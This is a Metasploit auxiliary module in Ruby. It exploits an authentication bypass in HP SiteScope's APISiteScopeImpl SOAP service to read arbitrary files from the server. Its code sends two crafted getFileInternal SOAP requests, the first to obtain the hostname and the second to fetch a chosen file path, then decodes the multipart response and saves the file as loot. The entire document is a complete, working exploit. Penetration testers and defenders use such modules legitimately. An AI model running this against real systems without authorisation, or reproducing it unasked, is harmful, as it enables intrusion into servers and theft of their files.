##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'HP SiteScope SOAP Call getFileInternal Remote File Access',
      'Description'  =>  %q{
          This module exploits an authentication bypass vulnerability in HP SiteScope to
        retrieve an arbitrary file from the remote server. It is accomplished by calling
        the getFileInternal operation available through the APISiteScopeImpl AXIS service.
        This module has been successfully tested on HP SiteScope 11.20 over Windows 2003
        SP2 and Linux Centos 6.3.
      },
      'References'   =>
        [
          [ 'OSVDB', '85119' ],
          [ 'BID', '55269' ],
          [ 'ZDI', '12-176' ]
        ],
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(8080),
      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
    ])

    register_autofilter_ports([ 8080 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    @uri = normalize_uri(target_uri.path)
    @uri << '/' if @uri[-1,1] != '/'

    print_status("Connecting to SiteScope SOAP Interface")

    res = send_request_cgi({
      'uri'     => "#{@uri}services/APISiteScopeImpl",
      'method'  => 'GET'})

    if not res
      print_error("Unable to connect")
      return
    end

    accessfile
  end

  def accessfile
    print_status("Retrieving the target hostname")

    data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
    data << "<wsns0:Envelope" + "\r\n"
    data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << "xmlns:xsd='http://www.w3.org/2001/XMLSchema'" + "\r\n"
    data << "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<wsns0:Body" + "\r\n"
    data << "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<impl:getFileInternal" + "\r\n"
    data << "xmlns:impl='http://Api.freshtech.COM'" + "\r\n"
    data << ">" + "\r\n"
    data << "<in0" + "\r\n"
    data << "xsi:nil='true'" + "\r\n"
    data << "xsi:type='xsd:string'" + "\r\n"
    data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << "></in0>" + "\r\n"
    data << "<in1" + "\r\n"
    data << "xsi:nil='true'" + "\r\n"
    data << "xsi:type='xsd:string'" + "\r\n"
    data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << "></in1>" + "\r\n"
    data << "</impl:getFileInternal>" + "\r\n"
    data << "</wsns0:Body>" + "\r\n"
    data << "</wsns0:Envelope>"

    res = send_request_cgi({
      'uri'      => "#{@uri}services/APISiteScopeImpl",
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => data,
      'headers'  => {
        'SOAPAction'    => '""',
    }}, 60)

    if res and res.code == 500 and res.body =~ /<ns3:hostname xmlns:ns3="http:\/\/xml.apache.org\/axis\/">(.*)<\/ns3:hostname>/m
      host_name = $1
    end

    if not host_name or host_name.empty?
      print_error("Failed to retrieve the host name")
      return
    end

    print_status("Retrieving the file contents")

    data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
    data << "<wsns0:Envelope" + "\r\n"
    data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << "xmlns:xsd='http://www.w3.org/2001/XMLSchema'" + "\r\n"
    data << "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<wsns0:Body" + "\r\n"
    data << "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'" + "\r\n"
    data << ">" + "\r\n"
    data << "<impl:getFileInternal" + "\r\n"
    data << "xmlns:impl='http://Api.freshtech.COM'" + "\r\n"
    data << ">" + "\r\n"
    data << "<in0" + "\r\n"
    data << "xsi:type='xsd:string'" + "\r\n"
    data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << ">#{host_name}</in0>" + "\r\n"
    data << "<in1" + "\r\n"
    data << "xsi:type='xsd:string'" + "\r\n"
    data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
    data << ">#{datastore['RFILE']}</in1>" + "\r\n"
    data << "</impl:getFileInternal>" + "\r\n"
    data << "</wsns0:Body>" + "\r\n"
    data << "</wsns0:Envelope>"

    res = send_request_cgi({
      'uri'      => "#{@uri}services/APISiteScopeImpl",
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => data,
      'headers'  => {
        'SOAPAction'    => '""',
    }})

    if res and res.code == 200

      if res.headers['Content-Type'] =~ /boundary="(.*)"/
        boundary = $1
      end
      if not boundary or boundary.empty?
        print_error("Failed to retrieve the file contents")
        return
      end

      if res.body =~ /getFileInternalReturn href="cid:([A-F0-9]*)"/
        cid = $1
      end
      if not cid or cid.empty?
        print_error("Failed to retrieve the file contents")
        return
      end

      if res.body =~ /#{cid}>\r\n\r\n(.*)\r\n--#{boundary}/m
        loot = Rex::Text.ungzip($1)
      end
      if not loot or loot.empty?
        print_error("Failed to retrieve the file contents")
        return
      end

      f = ::File.basename(datastore['RFILE'])
      path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
      print_good("#{datastore['RFILE']} saved in #{path}")
      return
    end

    print_error("Failed to retrieve the file contents")
  end
end

